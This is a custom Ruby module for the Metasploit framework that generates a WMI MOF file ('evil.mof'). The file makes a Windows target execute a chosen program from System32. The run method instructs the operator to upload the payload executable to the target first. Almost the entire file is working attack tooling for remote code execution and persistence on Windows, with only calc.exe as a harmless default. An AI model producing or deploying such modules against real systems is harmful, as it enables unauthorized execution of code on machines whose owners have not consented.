##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
#  include Msf::Auxiliary::Report
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec
	include Msf::Exploit::FILEFORMAT

  def initialize
    super(
      'Name'        => 'Prints the output of a MOF file for more fun later.',
      'Description' => '',
      'Author'      => 'wildkindcc',
      'License'     => MSF_LICENSE
    )

    register_options(
    [
	OptString.new('EXECUTE',   [true, 'The file within C:\\Windows\\System32 that the .MOF will look to execute.', 'calc.exe']),
	OptString.new('FILENAME', [true, 'Output filename', 'calc.mof']),
	OptString.new('DEBUG', [false, 'Show command output.', 'false'])
#      OptString.new('TO',   [false, 'The destination username to probe at each host', 'nobody']),
#      Opt::RPORT(5060)
    ])
  end

	def run
		print_status("Now you're ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to C:\\Windows\\System32.")
		payload_name = datastore['EXECUTE']

		mof_name = "evil.mof"
		mof = generate_mof(mof_name, payload_name)
		if datastore['DEBUG'] == "true"
			print("===========================================================")
			print("\n")
			print(mof)
			print("\n")
			print("===========================================================\n")
		end
		file_create(mof)

	end
end
